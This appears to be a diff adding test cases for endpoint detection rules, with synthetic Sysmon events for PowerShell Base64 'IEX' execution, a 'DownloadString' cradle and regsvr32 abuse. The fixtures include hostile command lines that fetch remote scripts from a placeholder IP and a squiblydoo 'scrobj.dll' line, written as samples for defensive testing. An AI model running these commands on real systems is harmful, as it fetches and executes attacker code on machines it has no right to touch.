@@ -585,6 +585,38 @@
             }
           }
         }
+      },
+      {
+        "name": "inline IEX + FromBase64String on raw command line (Atomic T1027 #3, no -EncodedCommand)",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp 'HKCU:Software\\Microsoft\\Windows\\CurrentVersion' Debug).Debug)))\""
+            }
+          }
+        }
+      },
+      {
+        "name": "plaintext DownloadString cradle on raw command line",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -Command \"(New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')\""
+            }
+          }
+        }
       }
     ]
   },
@@ -668,6 +700,92 @@
             "event_data": {
               "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
               "CommandLine": "powershell.exe -Command Get-Date"
+            }
+          }
+        }
+      }
+    ]
+  },
+  {
+    "rule_id": "f7a3c9e1-2b8d-4e6f-a1c5-9d0e3f7b2a48",
+    "rule_name": "Regsvr32 Loading a Non-Registrable File",
+    "cases": [
+      {
+        "name": "renamed local DLL (Atomic T1218.010 #4)",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\regsvr32.exe",
+              "CommandLine": "regsvr32.exe /s C:\\Users\\v\\AppData\\Local\\Temp\\shell32.jpg"
+            }
+          }
+        }
+      },
+      {
+        "name": "unregister of a renamed local DLL",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\regsvr32.exe",
+              "CommandLine": "regsvr32.exe /U /s C:\\Users\\v\\AppData\\Local\\Temp\\shell32.jpg"
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: ordinary DLL registration",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\regsvr32.exe",
+              "CommandLine": "regsvr32.exe /s C:\\Program Files\\App\\component.dll"
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: squiblydoo scrobj.dll is the other rule's job",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\regsvr32.exe",
+              "CommandLine": "regsvr32.exe /s /n /u /i:http://198.51.100.7/a.sct scrobj.dll"
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: bare regsvr32 launch with no target",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\regsvr32.exe",
+              "CommandLine": "C:\\Windows\\System32\\regsvr32.exe"
             }
           }
         }
